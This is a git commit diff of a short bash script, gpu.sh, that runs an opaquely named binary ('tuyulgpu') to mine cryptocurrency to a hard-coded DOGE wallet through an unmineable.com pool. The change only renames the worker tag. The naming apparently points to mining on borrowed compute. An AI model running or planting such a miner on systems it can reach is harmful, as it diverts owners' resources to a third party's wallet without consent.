92bc2d8ec3f55834950e9faf2fd1d683d8818893
pogchampv18 <86313403+pogchampv18@users.noreply.github.com>
2021-06-23 12:29:08 +0530

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
 WALLET=DOGE:D5o7ggptjmEoKME4rdCBWdaVkZagiZBzvB
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU)
 
 chmod +x tuyulgpu
 ./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
